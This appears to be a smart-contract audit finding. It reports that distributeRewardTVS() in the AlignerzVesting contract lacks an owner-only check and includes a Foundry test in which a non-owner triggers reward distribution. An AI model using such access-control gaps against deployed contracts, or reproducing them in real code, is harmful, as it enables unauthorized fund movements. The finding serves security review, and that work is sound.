# [000647] Access Control Inconsistency - Distribution Functions Have Different Privilege Levels
  
  ### Summary

The protocol's security boundary is unclear as two distribution functions use inconsistent access controls, potentially enabling unintended callers to trigger distributions.

### Root Cause

In `AlignerzVesting.sol` ([lines ~486–533](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L525C3-L535C6)), `distributeRewardTVS()` has no access control while `distributeRemainingRewardTVS()` uses `onlyOwner`, creating inconsistency in the intended security model.

### Internal Pre-conditions

Reward project must have passed its claim deadline

### External Pre-conditions

_No response_

### Attack Path

1. Owner intends distributions to be owner-only operations

2. But `distributeRewardTVS()` is missing `onlyOwner` modifier

3. Any caller can invoke `distributeRewardTVS()` at any time

4. Distributions happen without owner authorization

### Impact

The protocol suffers ambiguous privilege boundaries and potential unauthorized distribution of rewards. Trust in access control is weakened.

### PoC

```solidity
function test_PoC_distributeRewardTVS_non_owner_callable() public {
        vm.prank(projectCreator);
        vesting.launchRewardProject(address(token), address(usdt), block.timestamp, 1_000);

        address[] memory kols = new address[](1);
        kols[0] = address(0x3333);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 10 ether;

        vm.prank(projectCreator);
        vesting.setTVSAllocation(0, 10 ether, 30 days, kols, amounts);

        // fast-forward beyond claim window
        vm.warp(block.timestamp + 2_000);

        // Call distributeRewardTVS as a non-owner (first bidder) - should not revert due to missing onlyOwner
        vm.prank(bidders[0]);
        address[] memory supplied = new address[](1);
        supplied[0] = kols[0];
        vesting.distributeRewardTVS(0, supplied);
    }
```

### Mitigation

Make both owner-only (recommended)
